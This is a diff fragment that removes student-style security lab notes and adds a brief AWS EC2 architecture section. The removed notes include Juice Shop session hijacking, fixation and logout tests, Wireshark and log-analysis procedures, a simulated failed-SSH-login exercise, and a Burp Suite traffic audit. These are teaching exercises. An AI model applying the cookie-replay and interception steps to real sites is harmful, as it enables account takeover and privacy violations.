-2. Open another browser
-3. Replace cookie
-
-Result:
-Access gained without login
-
-Inference:
-Session hijacking possible
-
-Test 6: Session Fixation
-
-1. Note session ID before login
-2. Login
-3. Compare session ID
-
-Result:
-Same session ID remains
-
-Inference:
-Session fixation vulnerability exists
-
-Test 7: Logout Mechanism
-
-1. Login and copy cookie
-2. Logout
-3. Reuse cookie
-
-Result:
-Session still active
-
-Inference:
-Session not invalidated properly
-
-Test 8: JWT Token Analysis
-
-1. Copy JWT token
-2. Decode using jwt.io
-
-Result:
-Payload visible
-
-Inference:
-Improper token validation possible
-
-DOCKER COMMANDS USED
-
-docker ps
-docker stop juice-shop
-docker start juice-shop
-docker rm juice-shop
-docker logs juice-shop
-
-
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-NETWORK FORENSICS USING WIRESHARK
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-
-A. START WIRESHARK
-wireshark
-
-
-B. SELECT NETWORK INTERFACE
-eth0
-wlan0
-
-
-C. START CAPTURE
-Click Start
-
-
-D. GENERATE NETWORK TRAFFIC
-Open browser
-Visit websites
-Ping systems
-
-
-E. APPLY FILTERS
-http
-https
-dns
-tcp
-udp
-ip.addr == 192.168.1.1
-
-
-F. STOP CAPTURE
-Click Stop
-
-
-G. ANALYZE PACKETS
-
-Inspect:
-Source IP
-Destination IP
-Protocols
-DNS Queries
-HTTP Requests
-
-
-
-
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-LOG FILE ANALYSIS FOR INCIDENT DETECTION LAB
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-A. NAVIGATE TO LOG DIRECTORY
-cd /var/log
-ls
-
-B. VIEW SUCCESSFUL LOGIN RECORDS
-last
-
-C. VIEW SYSTEM LOGS (FULL)
-journalctl
-journalctl | less
-
-D. FILTER FAILED LOGIN ATTEMPTS
-journalctl | grep "Failed"
-journalctl | grep "Failed password"
-
-E. VIEW SSH LOGIN ACTIVITY
-journalctl | grep ssh
-
-F. FILTER SYSTEM ERRORS
-journalctl | grep -i error
-
-G. ANALYZE APACHE LOGS
-cd /var/log/apache2
-ls
-sudo less access.log
-
-H. DETECT SUSPICIOUS WEB REQUESTS
-grep "404" /var/log/apache2/access.log
-
-I. VIEW PACKAGE ACTIVITY
-less /var/log/dpkg.log
-
-J. REAL-TIME LOG MONITORING
-sudo journalctl -f
-
-K. SIMULATE FAILED SSH LOGIN ATTACK
-Install SSH Server
-sudo apt install openssh-server -y
-
-Start SSH Service
-2. sudo service ssh start
-
-Find IP Address
-3. ip a
-
-Generate Failed Logins
-4. ssh fakeuser@localhost
-5. ssh kali@localhost
-
-L. ANALYZE FAILED LOGIN ATTEMPTS
-journalctl | grep "Failed password"
-
-M. EXTRACT SUSPICIOUS IP ADDRESS
-journalctl | grep "Failed password" | awk '{print $11}'
-
-N. COUNT FAILED ATTEMPTS PER IP
-journalctl | grep "Failed password" | awk '{print $11}' | sort | uniq -c | sort -nr
-
-O. ALTERNATIVE METHOD (FAILED LOGINS)
-sudo lastb
-
-P. CHECK RECENT LOG ACTIVITY
-journalctl --since "10 minutes ago"
-
-
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-7. PRIVACY AUDIT OF POPULAR APPS (DESKTOP WHATSAPP) AND WEBSITES (FACEBOOK) & DATA BREACH CASE STUDY ANALYSIS
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-
-A. INSTALL NODE.js & npm
-
-sudo apt update
-
-sudo apt install nodejs npm -y
-
-
-B. INSTALL NATIVEFIER
-
-sudo npm install -g nativefier
-
-
-C. CREATE WHATSAPP DESKTOP APP
-
-nativefier https://web.whatsapp.com
-
-ls
-
-
-D. RUN WHATSAPP DESKTOP
-
-cd WhatsAppWeb-linux-x64
-
-./WhatsAppWeb
-
-
-E. LOGIN TO WHATSAPP
-
-Open mobile WhatsApp
-Linked Devices
-Scan QR code
-
-
-F. ANALYZE TRACKERS (EXODUS PRIVACY)
-
-https://reports.exodus-privacy.eu.org
-
-
-G. START WIRESHARK CAPTURE
-
-wireshark
-
-
-H. GENERATE NETWORK TRAFFIC
-
-Send messages
-Send images
-Open chats
-
-
-I. APPLY WIRESHARK FILTERS
-
-tls
-
-dns
-
-
-J. STOP WIRESHARK CAPTURE
-
-Click Stop
-
-
-K. OPEN FACEBOOK WEBSITE
-
-https://www.facebook.com
-
-
-L. START BURP SUITE
-
-burpsuite
-
-
-M. CONFIGURE PROXY
-
-IP: 127.0.0.1
-Port: 8080
-
-
-N. ENABLE INTERCEPTION
-
-Turn Intercept ON
-Reload Facebook page
-
-
-O. ANALYZE TRAFFIC
-
-Press F12
-Open Network tab
-
-
-P. CHECK EMAIL DATA BREACH
-
-https://haveibeenpwned.com
+Open browser → http://<PUBLIC_IP>
+========================================================
+9. FINAL ARCHITECTURE
+Internet
+↓
+Internet Gateway
+↓
+Public Subnet (10.0.1.0/24)
+↓
+EC2 Instance (Public IP enabled)
+
+========================================================
+END OF DOCUMENT
